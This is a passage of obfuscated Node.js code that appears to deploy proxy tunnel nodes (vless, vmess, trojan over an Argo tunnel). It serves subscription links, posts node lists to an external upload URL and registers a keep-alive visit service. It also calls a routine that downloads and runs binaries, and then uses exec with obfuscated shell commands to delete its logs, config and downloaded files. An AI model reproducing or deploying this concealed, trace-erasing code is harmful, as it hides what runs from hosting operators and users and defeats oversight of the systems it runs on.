_0x3c9b37={_0x56711e:0xb7},_0x494068=_0x4527,_0x4f1f04={'v':'2','ps':''+_0x172811,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x494068(0xdb),'net':'ws','type':'none','host':_0x2f37af,'path':'/vmess-argo?ed=2560','tls':_0x494068(_0x3756cd._0x23c370),'sni':_0x2f37af,'alpn':'','fp':_0x494068(0xd0)},_0x55812a=_0x494068(_0x3756cd._0x7fdc62)+UUID+'@'+CFIP+':'+CFPORT+_0x494068(0x112)+_0x2f37af+_0x494068(_0x3756cd._0x4e08fe)+_0x2f37af+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x172811+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON[_0x494068(_0x3756cd._0x2d5c78)](_0x4f1f04))['toString'](_0x494068(_0x3756cd._0x18eb98))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x494068(0x9d)+_0x2f37af+'&fp=firefox&type=ws&host='+_0x2f37af+_0x494068(_0x3756cd._0x31727f)+_0x172811+_0x494068(_0x3756cd._0x5b0298);console[_0x494068(0x11f)](Buffer[_0x494068(0xb8)](_0x55812a)[_0x494068(_0x3756cd._0x537128)]('base64')),fs['writeFileSync'](subPath,Buffer['from'](_0x55812a)[_0x494068(0xb7)](_0x494068(0x113))),console[_0x494068(0x11f)](FILE_PATH+_0x494068(0xf8)),uploadNodes(),app[_0x494068(_0x3756cd._0xcd17c1)]('/'+SUB_PATH,(_0x217340,_0x231b50)=>{const _0x275d8b=_0x494068,_0x5645c8=Buffer['from'](_0x55812a)[_0x275d8b(_0x3c9b37._0x56711e)](_0x275d8b(0x113));_0x231b50[_0x275d8b(0xa4)](_0x275d8b(0x14c),'text/plain;\x20charset=utf-8'),_0x231b50['send'](_0x5645c8);}),_0x568066(_0x55812a);},0x7d0);});}}async function uploadNodes(){const _0x486e39={_0x23f34c:0x136,_0x2ea984:0xc0,_0x209658:0x140,_0x3f3c35:0xbd,_0x57e748:0xcd,_0x4c9be5:0x9e,_0x2d609e:0xd8},_0x327d24=_0x12b8bb;if(UPLOAD_URL&&PROJECT_URL){const _0x433445=PROJECT_URL+'/'+SUB_PATH,_0x5f5704={'subscription':[_0x433445]};try{const _0x4f6893=await axios['post'](UPLOAD_URL+_0x327d24(_0x486e39._0x23f34c),_0x5f5704,{'headers':{'Content-Type':_0x327d24(0xd8)}});return _0x4f6893&&_0x4f6893[_0x327d24(0x146)]===0xc8?(console[_0x327d24(0x11f)]('Subscription\x20uploaded\x20successfully'),_0x4f6893):null;}catch(_0x2c0b50){if(_0x2c0b50[_0x327d24(_0x486e39._0x2ea984)]){if(_0x2c0b50['response'][_0x327d24(0x146)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x19450e=fs[_0x327d24(_0x486e39._0x209658)](listPath,_0x327d24(_0x486e39._0x3f3c35)),_0x2cb56d=_0x19450e['split']('\x0a')[_0x327d24(_0x486e39._0x57e748)](_0xdbf0ee=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x327d24(0xc4)](_0xdbf0ee));if(_0x2cb56d[_0x327d24(_0x486e39._0x4c9be5)]===0x0)return;const _0x2161c8=JSON[_0x327d24(0xd7)]({'nodes':_0x2cb56d});try{const _0x7cbb84=await axios[_0x327d24(0x14b)](UPLOAD_URL+_0x327d24(0x110),_0x2161c8,{'headers':{'Content-Type':_0x327d24(_0x486e39._0x2d609e)}});return _0x7cbb84&&_0x7cbb84[_0x327d24(0x146)]===0xc8?(console['log'](_0x327d24(0x11c)),_0x7cbb84):null;}catch(_0x3809be){return null;}}else return;}}function cleanFiles(){const _0x271570={_0x3f1732:0x141,_0x2c4e6c:0x12d,_0x33f256:0xd4,_0x512dcb:0x114},_0x2b3769={_0x31ba35:0x11f};setTimeout(()=>{const _0x4eacd0={_0x3f1147:0x10a,_0x5a1039:0x99,_0x438fc1:0x132},_0x23d5da=_0x4527,_0x141366=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x141366[_0x23d5da(0x141)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x141366[_0x23d5da(_0x271570._0x3f1732)](phpPath);process[_0x23d5da(_0x271570._0x2c4e6c)]==='win32'?exec(_0x23d5da(0xfd)+_0x141366[_0x23d5da(0xbf)]('\x20')+_0x23d5da(0x14d),_0x281d7e=>{const _0x1da2a7=_0x23d5da;console[_0x1da2a7(0x10a)](),console[_0x1da2a7(0x11f)](_0x1da2a7(0x99)),console[_0x1da2a7(_0x2b3769._0x31ba35)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x23d5da(_0x271570._0x33f256)+_0x141366[_0x23d5da(0xbf)]('\x20')+_0x23d5da(_0x271570._0x512dcb),_0xb694fc=>{const _0x5bf09b=_0x23d5da;console[_0x5bf09b(_0x4eacd0._0x3f1147)](),console[_0x5bf09b(0x11f)](_0x5bf09b(_0x4eacd0._0x5a1039)),console[_0x5bf09b(0x11f)](_0x5bf09b(_0x4eacd0._0x438fc1));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1424f7={_0x5ac5dd:0x11f,_0x518689:0xf4,_0x285044:0xea},_0x2c3b38=_0x12b8bb;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2c3b38(_0x1424f7._0x5ac5dd)](_0x2c3b38(0xff));return;}try{const _0xd1b4a3=await axios['post'](_0x2c3b38(_0x1424f7._0x518689),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2c3b38(0xd8)}});return console[_0x2c3b38(_0x1424f7._0x5ac5dd)](_0x2c3b38(0xe6)),_0xd1b4a3;}catch(_0x264dce){return console['error'](_0x2c3b38(_0x1424f7._0x285044)+_0x264dce[_0x2c3b38(0x13a)]),null;}}async function startserver(){const _0x48cc8a={_0xe3b6f1:0x156},_0x2c1ce9=_0x12b8bb;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x51fe51){console['error'](_0x2c1ce9(_0x48cc8a._0xe3b6f1),_0x51fe51);}}function _0x4527(_0x486a1d,_0x54ef68){const _0x5f2d66=_0x5f2d();return _0x4527=function(_0x4527e1,_0xb0e894){_0x4527e1=_0x4527e1-0x97;let _0x55b96b=_0x5f2d66[_0x4527e1];return _0x55b96b;},_0x4527(_0x486a1d,_0x54ef68);}startserver()[_0x12b8bb(0x15c)](_0x4ceb2b=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x4ceb2b);}),app[_0x12b8bb(0xc9)](PORT,()=>console[_0x12b8bb(0x11f)](_0x12b8bb(0x128)+PORT+'!'));
